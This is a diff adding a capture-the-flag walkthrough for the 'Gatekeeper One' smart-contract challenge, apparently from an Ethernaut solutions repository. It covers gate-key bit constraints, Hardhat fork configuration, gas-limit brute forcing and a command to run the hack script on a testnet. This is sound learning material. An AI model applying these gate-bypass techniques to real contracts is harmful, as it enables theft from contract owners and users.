@@ -125,3 +125,68 @@ npx hardhat run scripts/privacy_hack.js --network rinkeby
 - https://solidity-by-example.org/hacks/accessing-private-data/
 - https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-sendtransaction
 
+## Gatekeeper One
+
+```
+bytes8 key = '0x1122334455667788'
+uint16(uint64(key))  // 0x7788
+uint32(uint64(key))  // 0x55667788
+
+// it means _gateKey[4:6] == 0
+uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
+// it means _gateKey[0:4] != 0x0
+uint32(uint64(_gateKey)) != uint64(_gateKey)
+// it means _gateKey[6:8] = tx.origin[18:20]
+uint32(uint64(_gateKey)) == uint16(tx.origin)
+```
+
+add hardhat fork settings
+
+```js
+module.exports = {
+  networks: {
+    hardhat: {
+      forking: {
+        url: process.env.HTTP_ENDPOINT,
+      }
+    },
+    rinkeby: {
+      url: process.env.HTTP_ENDPOINT,
+      accounts: [process.env.PRIVATE_KEY],
+    }
+  },
+  solidity: "0.6.12",
+};
+```
+
+add `.env` settings
+
+```dotenv
+GATEKEEPER_ONE_ADDR=0x0000000000000000000000000000000000000000
+```
+
+run
+
+```bash
+npx hardhat test test/gatekeeper_one.js
+```
+
+```
+try gasLimit: 900000
+......
+try gasLimit: 901264
+entrant: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+entrant: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
+    ✓ GatekeeperOne (23173ms)
+
+
+  1 passing (23s)
+```
+
+We can know the tryGas is 901264.
+
+run
+
+```bash
+npx hardhat run scripts/gatekeeper_one_hack.js --network rinkeby
+```
